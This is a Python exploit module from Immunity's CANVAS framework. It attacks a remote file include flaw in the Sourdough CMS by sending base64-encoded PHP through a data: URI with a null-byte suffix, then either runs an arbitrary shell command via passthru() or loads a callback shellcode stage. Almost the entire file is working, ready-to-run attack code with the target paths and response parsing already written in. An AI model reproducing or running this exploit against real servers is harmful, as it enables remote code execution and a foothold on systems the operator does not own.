#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.phpexploit import *
import canvasengine
import urllib
import libs.spkproxy as spkproxy #for urlopen

NAME="Sourdough Remote File Include"
DESCRIPTION="Sourdough Remote FIle Include"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sourdough"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]= "Unknown"
DOCUMENTATION["CVE Url"]= "Unknown" 
DOCUMENTATION["References"]=["http://securityreason.com/exploitalert/5652"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Remote File Include magic:
exploits an include() bug like it was an eval()
to get PHP code execution. 
"""

CHANGELOG="""
"""

class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        self.port=80
        self.host=""
        self.setVersions()
        self.version=0
        self.done=0
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/sourdough/","/cms/","/"]
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        self.verb="GET"
        self.content_type=""
        self.targetpath="thirdparty/patForms/examples/example_clientside_javascript.php"
        self.foundstrings=["Sourdough"]
        self.testfile="doc/CHANGELOG"

        return

    def geturlarguments(self):
        """
        Creates an exploit string that either executes a command
        or uses our callback shellcode
        """

        if self.command:
            self.log("Command: %s"%self.command)
            command=self.command
            command="data:;base64,"+b64encode("<?print(startz);passthru('"+command+"');print(endz);")
            command=urllib.quote_plus(command)
            exp="neededFiles[patForms]="+command+"%00"
        else:
            command=self.get_php_to_mosdef()
            command="data:;base64,"+b64encode("<?"+command)
            command=urllib.quote_plus(command)
            exp="neededFiles[patForms]="+command+"%00"
        return exp 

    def parse_command_response(self, data):
        """
        Give me the result of my command
        """
        if "startz" in data:
            result=data.split("startz")[1].split("endz")[0]
            self.log("Command response: %s"%prettyprint(result))
        else:
            self.log("Command not run, allow_url_include may be turned off, or system is patched.")
        return result


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
